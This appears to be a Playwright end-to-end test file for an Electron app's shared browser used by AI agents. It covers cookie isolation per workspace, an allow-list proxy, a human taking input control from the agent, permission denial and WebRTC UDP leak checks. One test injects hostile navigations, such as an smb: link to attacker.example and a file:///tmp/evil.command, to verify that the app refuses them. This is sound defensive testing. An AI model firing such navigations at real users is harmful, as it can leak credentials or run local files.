import { _electron as electron, expect, test, type ElectronApplication } from '@playwright/test';
import { build } from 'esbuild';
import { cpSync, mkdtempSync, rmSync } from 'node:fs';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

/**
 * #298 S6: the shared browser in a real Electron (the desktop's ElectronBrowser + the engine in-process, as in the
 * app). A chat's tab opens in a WebContentsView of its workspace's profile, through the allow-list proxy; a restart
 * brings the same address back; agent A's profile holds no cookie of agent B; a host outside the allow-list is
 * refused in the pane; Master's input is blocked while the agent has the tab. The pane UI (#306) is not part of S6.
 */

const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const out = join(root, 'e2e', 'electron', '.out');
const electronBin = createRequire(join(root, 'package.json'))('electron') as unknown as string;

test.describe.configure({ mode: 'serial' });

test.beforeAll(async () => {
  await build({
    entryPoints: [join(root, 'e2e', 'electron', 'browser-app.ts')],
    bundle: true,
    platform: 'node',
    format: 'esm',
    target: 'node22',
    outfile: join(out, 'browser-app.mjs'),
    external: ['electron', 'better-sqlite3', 'sharp', 'sherpa-onnx-node', 'bufferutil', 'utf-8-validate'],
    banner: { js: "import { createRequire as __cr } from 'node:module'; const require = __cr(import.meta.url);" },
    logLevel: 'warning',
  });
  cpSync(join(root, 'packages', 'engine', 'src', 'store', 'migrations'), join(out, 'migrations'), { recursive: true });
});

/** A local site: sets a cookie, counts clicks on its button. Loopback goes direct (the agent's dev server). */
async function site(): Promise<{ url: string; close(): Promise<void> }> {
  const s = http.createServer((req, res) => {
    if (req.url?.startsWith('/dl')) res.setHeader('content-disposition', 'attachment; filename="atlas.dmg"');
    res.setHeader('set-cookie', `visit=${encodeURIComponent(req.url ?? '/')}; Path=/; Max-Age=3600`);
    res.setHeader('content-type', 'text/html');
    res.end(
      `<title>Site ${req.url}</title><button id=b style="position:fixed;left:0;top:0;width:400px;height:300px" onclick="this.dataset.n=(+this.dataset.n||0)+1;this.textContent=this.dataset.n" data-n=0>0</button><input id=i style="position:fixed;top:320px">`,
    );
  });
  await new Promise<void>((ok) => s.listen(0, '127.0.0.1', () => ok()));
  return { url: `http://127.0.0.1:${(s.address() as { port: number }).port}`, close: () => new Promise((ok) => s.close(() => ok())) };
}

async function launch(dataDir: string) {
  const app = await electron.launch({ executablePath: electronBin, args: [join(out, 'browser-app.mjs')], env: { ...process.env, ATLAS_E2E_DIR: dataDir } as Record<string, string> });
  await expect.poll(() => app.evaluate(() => !!(globalThis as { __atlas?: unknown }).__atlas), { timeout: 30_000 }).toBe(true);
  const url = await app.evaluate(() => (globalThis as unknown as { __atlas: { url: string } }).__atlas.url);
  const call = async <T = unknown>(method: string, path: string, body?: unknown): Promise<{ status: number; body: T }> => {
    const r = await fetch(url + '/api' + path, { method, headers: { 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) });
    const t = await r.text();
    return { status: r.status, body: (t ? JSON.parse(t) : null) as T };
  };
  /** What a tab's view shows (address, page text), read in the Electron main process. */
  const view = (chatId: string) =>
    app.evaluate(async (_e, id) => {
      const tab = (globalThis as any).__atlas.host.tabs.get(id);
      if (!tab) return null;
      const wc = tab.view.webContents;
      return { url: wc.getURL() as string, visible: tab.view.getVisible() as boolean, text: wc.isLoading() ? null : ((await wc.executeJavaScript('document.body?.innerText ?? ""')) as string) };
    }, chatId);
  return { app, call, view };
}

type Tab = { chatId: string; url: string | null; title: string; owner: string; loading: boolean; error: string | null };

let dataDir: string;
let atlas: Awaited<ReturnType<typeof launch>>;
let web: Awaited<ReturnType<typeof site>>;
let app: ElectronApplication;

test.beforeEach(async () => {
  dataDir = mkdtempSync(join(tmpdir(), 'atlas-e2e-browser-'));
  web = await site();
  atlas = await launch(dataDir);
  app = atlas.app;
});

test.afterEach(async () => {
  await app.close().catch(() => {});
  await web.close();
  rmSync(dataDir, { recursive: true, force: true });
});

test('a chat’s link opens in its view, shown in the pane’s place; a restart brings the same address back', async () => {
  const chat = (await atlas.call<{ id: string }>('POST', '/agents/atlas/chats')).body;
  const opened = await atlas.call<Tab>('POST', `/browser/tabs/${chat.id}/open`, { url: web.url + '/first' });
  expect(opened.status).toBe(200);
  await atlas.call('PUT', '/browser/view', { chatId: chat.id, bounds: { x: 600, y: 80, width: 600, height: 700 } });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body).toMatchObject({ url: web.url + '/first', title: 'Site /first', loading: false, error: null });
  expect(await atlas.view(chat.id)).toMatchObject({ url: web.url + '/first', visible: true });
  // A link followed inside the page: the new address is stored.
  await app.evaluate((_e, [id, to]) => (globalThis as any).__atlas.host.tabs.get(id).view.webContents.loadURL(to), [chat.id, web.url + '/second'] as const);
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body.url).toBe(web.url + '/second');

  await app.close();
  atlas = await launch(dataDir);
  app = atlas.app;
  expect((await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body).toMatchObject({ url: web.url + '/second' });
  await atlas.call('PUT', '/browser/view', { chatId: chat.id, bounds: { x: 600, y: 80, width: 600, height: 700 } });
  await expect.poll(async () => (await atlas.view(chat.id))?.url).toBe(web.url + '/second');
});

test('one profile per workspace: agent A’s partition holds no cookie of agent B', async () => {
  const models = (await atlas.call<{ id: string }[]>('GET', '/models')).body;
  expect((await atlas.call('POST', '/agents', { id: 'bob', modelId: models[0]!.id })).status).toBe(201);
  const a = (await atlas.call<{ id: string }>('POST', '/agents/atlas/chats')).body;
  const b = (await atlas.call<{ id: string }>('POST', '/agents/bob/chats')).body;
  await atlas.call('POST', `/browser/tabs/${a.id}/open`, { url: web.url + '/from-a' });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${a.id}`)).body.loading).toBe(false);
  const pid = (await atlas.call<{ id: string }[]>('GET', '/projects')).body[0]!.id;
  const cookies = (partition: string) => app.evaluate(async ({ session }, p) => (await session.fromPartition(p).cookies.get({})).map((c) => `${c.name}=${c.value}`), partition);
  expect(await cookies(`persist:ws-${pid}-atlas`)).toEqual(['visit=%2Ffrom-a']);
  expect(await cookies(`persist:ws-${pid}-bob`)).toEqual([]);
  await atlas.call('POST', `/browser/tabs/${b.id}/open`, { url: web.url + '/from-b' });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${b.id}`)).body.loading).toBe(false);
  expect(await cookies(`persist:ws-${pid}-bob`)).toEqual(['visit=%2Ffrom-b']);
  expect(await cookies(`persist:ws-${pid}-atlas`)).toEqual(['visit=%2Ffrom-a']);
  expect(await cookies('persist:master')).toEqual([]);
});

test('a host outside the workspace’s allow-list is refused in the pane, with the reason', async () => {
  const pid = (await atlas.call<{ id: string }[]>('GET', '/projects')).body[0]!.id;
  await atlas.call('PATCH', `/projects/${pid}`, { network: 'hosts', allowedHosts: ['github.com'] });
  const chat = (await atlas.call<{ id: string }>('POST', '/agents/atlas/chats')).body;
  await atlas.call('POST', `/browser/tabs/${chat.id}/open`, { url: 'https://example.com/' });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body.error, { timeout: 20_000 }).toBe(
    "example.com is not in this workspace's allowed hosts (Settings → Workspaces)",
  );
  const refusals = (await atlas.call<{ host: string }[]>('GET', `/projects/${pid}/refusals`)).body;
  expect(refusals.map((r) => r.host)).toContain('example.com');
  // The agent's dev server (loopback) still opens.
  await atlas.call('POST', `/browser/tabs/${chat.id}/open`, { url: web.url + '/dev' });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body).toMatchObject({ title: 'Site /dev', error: null });
});

test('Master’s input is blocked while the agent acts; a click when it is not acting takes control; the agent’s CDP input passes', async () => {
  const chat = (await atlas.call<{ id: string }>('POST', '/agents/atlas/chats')).body;
  await atlas.call('POST', `/browser/tabs/${chat.id}/open`, { url: web.url + '/input' });
  await atlas.call('PUT', '/browser/view', { chatId: chat.id, bounds: { x: 600, y: 80, width: 600, height: 700 } });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body.loading).toBe(false);
  /** Master's click: a real mouse press and release in the view (what the window would deliver). */
  const masterClick = () =>
    app.evaluate(async (_e, id) => {
      const wc = (globalThis as any).__atlas.host.tabs.get(id).view.webContents;
      wc.sendInputEvent({ type: 'mouseDown', x: 100, y: 100, button: 'left', clickCount: 1 });
      wc.sendInputEvent({ type: 'mouseUp', x: 100, y: 100, button: 'left', clickCount: 1 });
      await new Promise((ok) => setTimeout(ok, 300));
    }, chat.id);
  const count = async () => (await atlas.view(chat.id))?.text?.match(/^\d+/)?.[0];
  const owner = async () => (await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body.owner;
  const agentClick = () =>
    app.evaluate(async (_e, id) => {
      const b = (globalThis as any).__atlas.engine.browser;
      for (const type of ['mousePressed', 'mouseReleased']) await b.cdp(id, 'Input.dispatchMouseEvent', { type, x: 100, y: 100, button: 'left', clickCount: 1 }, 'agent');
      b.acted(id, { verb: 'clicked', target: 'Count', point: { x: 100, y: 100 } });
    }, chat.id);

  await masterClick();
  await expect.poll(count).toBe('1');

  // The agent has the tab and is acting: its CDP click goes through, Master's clicks are refused (and reported).
  await atlas.call('POST', `/browser/tabs/${chat.id}/owner`, { owner: 'agent' });
  await agentClick();
  await expect.poll(count).toBe('2');
  // The agent's input window closes a moment after its CDP call (desktop browser.ts: send).
  await expect.poll(() => app.evaluate((_e, id) => (globalThis as any).__atlas.host.tabs.get(id).agentInput, chat.id)).toBe(0);
  await masterClick();
  await masterClick();
  expect(await count()).toBe('2');
  expect(await owner()).toBe('agent');
  const blocked = await app.evaluate(() => (globalThis as any).__atlas.events.filter((e: any) => e.type === 'browser.updated' && e.blocked).length);
  expect(blocked).toBeGreaterThanOrEqual(1);

  // Take control: Master's clicks count again, the agent's calls are refused at once.
  await atlas.call('POST', `/browser/tabs/${chat.id}/owner`, { owner: 'master' });
  await masterClick();
  await expect.poll(count).toBe('3');
  const refused = await app.evaluate(async (_e, id) => {
    try {
      await (globalThis as any).__atlas.engine.browser.cdp(id, 'Page.reload', {}, 'agent');
      return 'not refused';
    } catch (e) {
      return (e as Error).message;
    }
  }, chat.id);
  expect(refused).toBe('Master is using the browser');

  // Handed back but idle (no recent action): Master's first click takes control (swallowed), the next one counts.
  await atlas.call('POST', `/browser/tabs/${chat.id}/owner`, { owner: 'agent' });
  await masterClick();
  await expect.poll(owner).toBe('master');
  await masterClick();
  await expect.poll(count).toBe('4');
});

/** A tab of agent atlas on the local site, on screen, loaded. */
async function agentTab(path: string): Promise<string> {
  const chat = (await atlas.call<{ id: string }>('POST', '/agents/atlas/chats')).body;
  await atlas.call('POST', `/browser/tabs/${chat.id}/open`, { url: web.url + path });
  await atlas.call('PUT', '/browser/view', { chatId: chat.id, bounds: { x: 600, y: 80, width: 600, height: 700 } });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/${chat.id}`)).body).toMatchObject({ loading: false, error: null });
  return chat.id;
}
/** Runs `code` in the tab's page (no user gesture: what a page does by itself). */
const inPage = (id: string, code: string) =>
  app.evaluate((_e, [tid, c]) => (globalThis as any).__atlas.host.tabs.get(tid).view.webContents.executeJavaScript(c), [id, code] as const);
const opened = () => app.evaluate(() => [...(globalThis as any).__atlas.opened] as string[]);
const tabError = async (id: string) => (await atlas.call<Tab>('GET', `/browser/tabs/${id}`)).body.error;

test('a page cannot hand smb:, file: or app schemes to the system; mailto: and downloads leave only after Master’s click', async () => {
  const id = await agentTab('/schemes');
  // By itself, a page gets nothing out: not smb: (mount a share), not file:, not a custom app scheme, not even mailto:.
  for (const code of [`location.href = 'smb://attacker.example/share'`, `window.open('file:///tmp/evil.command')`, `location.href = 'zoommtg://x'`]) {
    await inPage(id, code);
    await expect.poll(() => tabError(id)).toMatch(/outside Atlas: refused \(only mailto: and tel: links/);
  }
  await inPage(id, `location.href = 'mailto:a@b.test'`);
  await expect.poll(() => tabError(id)).toContain('without your click');
  await inPage(id, `location.href = '${web.url}/dl'`);
  await expect.poll(() => tabError(id)).toMatch(/\/dl outside Atlas without your click/);
  expect(await opened()).toEqual([]);

  // Master's own click: the mailto: link, then the download, go to the system (each click once).
  await atlas.call('POST', `/browser/tabs/${id}/owner`, { owner: 'master' });
  const clickTo = async (target: string) => {
    await inPage(id, `document.getElementById('b').onclick = () => { location.href = ${JSON.stringify(target)} }; 0`);
    await app.evaluate(async (_e, tid) => {
      const wc = (globalThis as any).__atlas.host.tabs.get(tid).view.webContents;
      wc.sendInputEvent({ type: 'mouseDown', x: 100, y: 100, button: 'left', clickCount: 1 });
      wc.sendInputEvent({ type: 'mouseUp', x: 100, y: 100, button: 'left', clickCount: 1 });
    }, id);
  };
  await clickTo('mailto:a@b.test');
  await expect.poll(opened).toEqual(['mailto:a@b.test']);
  await clickTo(web.url + '/dl');
  await expect.poll(opened).toEqual(['mailto:a@b.test', web.url + '/dl']);
  // Master's click does not open smb: either.
  await clickTo('smb://attacker.example/share');
  await expect.poll(() => tabError(id)).toContain('smb://attacker.example/share outside Atlas: refused');
  expect(await opened()).toHaveLength(2);
});

test('every permission is denied: microphone, camera, notifications, location (agent tabs and Master’s pane)', async () => {
  const id = await agentTab('/perm');
  await atlas.call('POST', `/browser/tabs/master/open`, { url: web.url + '/perm-master' });
  await atlas.call('PUT', '/browser/view', { chatId: 'master', bounds: { x: 600, y: 80, width: 600, height: 700 } });
  await expect.poll(async () => (await atlas.call<Tab>('GET', `/browser/tabs/master`)).body).toMatchObject({ loading: false, error: null });
  const probe = `(async () => {
    const t = (p) => Promise.race([p, new Promise((r) => setTimeout(() => r('timeout'), 3000))]);
    const media = await t(navigator.mediaDevices.getUserMedia({ audio: true }).then(() => 'granted', (e) => 'denied:' + e.name));
    const camera = await t(navigator.mediaDevices.getUserMedia({ video: true }).then(() => 'granted', (e) => 'denied:' + e.name));
    const notif = await t(Notification.requestPermission());
    const geo = await t(new Promise((r) => navigator.geolocation.getCurrentPosition(() => r('granted'), (e) => r('denied:' + e.code))));
    const mic = (await navigator.permissions.query({ name: 'microphone' })).state;
    return { media, camera, notif, geo, mic };
  })()`;
  for (const tab of [id, 'master']) {
    const r = await inPage(tab, probe);
    expect(r.media).toMatch(/^denied/);
    expect(r.camera).toMatch(/^denied/);
    expect(r.notif).toBe('denied');
    expect(r.geo).toMatch(/^denied/);
    expect(r.mic).toBe('denied');
  }
});

test('WebRTC sends no UDP past the proxy: no host or srflx UDP candidate on Allowed hosts or Off', async () => {
  const pid = (await atlas.call<{ id: string }[]>('GET', '/projects')).body[0]!.id;
  const gather = `(async () => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('x');
    const seen = [];
    pc.onicecandidate = (e) => e.candidate && seen.push(e.candidate.candidate);
    await pc.setLocalDescription(await pc.createOffer());
    await new Promise((r) => { pc.onicegatheringstatechange = () => pc.iceGatheringState === 'complete' && r(); setTimeout(r, 4000); });
    pc.close();
    return seen;
  })()`;
  for (const level of ['hosts', 'off'] as const) {
    await atlas.call('PATCH', `/projects/${pid}`, { network: level, allowedHosts: ['github.com'] });
    const id = await agentTab('/rtc-' + level);
    const candidates = (await inPage(id, gather)) as string[];
    expect(candidates.filter((c) => / udp /i.test(c))).toEqual([]);
  }
});

test('agent tools (S7): snapshot → click → type → Master takes control → hand back → fresh snapshot with Master’s edit', async () => {
  const chat = (await atlas.call<{ id: string }>('POST', '/agents/atlas/chats')).body;
  const tool = (name: string, input: unknown) =>
    app.evaluate((_e, [n, i, id]) => (globalThis as any).__atlas.tool(n, i, id), [name, input, chat.id] as const) as Promise<{ output: string; isError: boolean }>;
  const ref = (snap: string, role: string) => Number(snap.match(new RegExp(`- ${role}[^\\n]*\\[ref=(\\d+)\\]`))?.[1]);

  const opened = await tool('browser_open', { url: web.url + '/tools' });
  expect(opened.isError).toBe(false);
  await atlas.call('PUT', '/browser/view', { chatId: chat.id, bounds: { x: 600, y: 80, width: 600, height: 700 } });
  const snap = await tool('browser_snapshot', {});
  expect(snap.output).toContain(`Page: Site /tools\nURL: ${web.url}/tools`);
  const button = ref(snap.output, 'button');
  const box = ref(snap.output, 'textbox');
  expect(button).toBeGreaterThan(0);
  expect(box).toBeGreaterThan(0);

  const clicked = await tool('browser_act', { action: 'click', ref: button });
  expect(clicked.isError).toBe(false);
  expect(clicked.output).toMatch(/- button "1" \[ref=\d+\]/);
  const typed = await tool('browser_act', { action: 'type', ref: box, text: 'munih' });
  expect(typed.output).toMatch(/- textbox \[ref=\d+\] value="munih" focused/);

  // Master takes control: the agent's calls are refused at once; Master types in the box (real key events).
  await atlas.call('POST', `/browser/tabs/${chat.id}/owner`, { owner: 'master' });
  expect(await tool('browser_act', { action: 'click', ref: button })).toEqual({ output: expect.stringMatching(/^Master is using the browser/), isError: true });
  await app.evaluate(async (_e, id) => {
    const wc = (globalThis as any).__atlas.host.tabs.get(id).view.webContents;
    for (const c of ' and Master') wc.sendInputEvent({ type: 'char', keyCode: c });
    await new Promise((ok) => setTimeout(ok, 300));
  }, chat.id);
  await expect.poll(async () => app.evaluate((_e, id) => (globalThis as any).__atlas.host.tabs.get(id).view.webContents.executeJavaScript('document.getElementById("i").value'), chat.id)).toBe('munih and Master');

  // Hand back: the next call starts with it and the page as Master left it.
  await atlas.call('POST', `/browser/tabs/${chat.id}/owner`, { owner: 'agent' });
  const back = await tool('browser_snapshot', {});
  expect(back.isError).toBe(false);
  expect(back.output.startsWith('Master handed back the browser; the page is now:\nPage: Site /tools')).toBe(true);
  expect(back.output).toContain('value="munih and Master"');
  expect((await tool('browser_snapshot', {})).output.startsWith('Page: ')).toBe(true);
});
